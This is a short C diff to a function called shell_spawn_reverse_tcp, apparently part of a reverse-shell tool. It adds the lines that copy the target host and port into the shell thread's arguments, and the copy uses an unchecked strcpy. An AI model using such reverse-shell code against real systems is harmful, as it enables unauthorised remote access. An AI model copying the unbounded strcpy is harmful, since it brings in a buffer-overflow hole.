@@ -118,6 +118,8 @@ bool shell_spawn_reverse_tcp(char *host, int host_port, int shell_type, bool she
   }
   p_shell_reverse_tcp_args->shell_type = shell_type;
   p_shell_reverse_tcp_args->shell_async = shell_async;
+  strcpy(p_shell_reverse_tcp_args->host, host);
+  p_shell_reverse_tcp_args->host_port = host_port;
   pthread_t shell_reverse_tcp_thread;
   pthread_create(&shell_reverse_tcp_thread,
                  NULL,
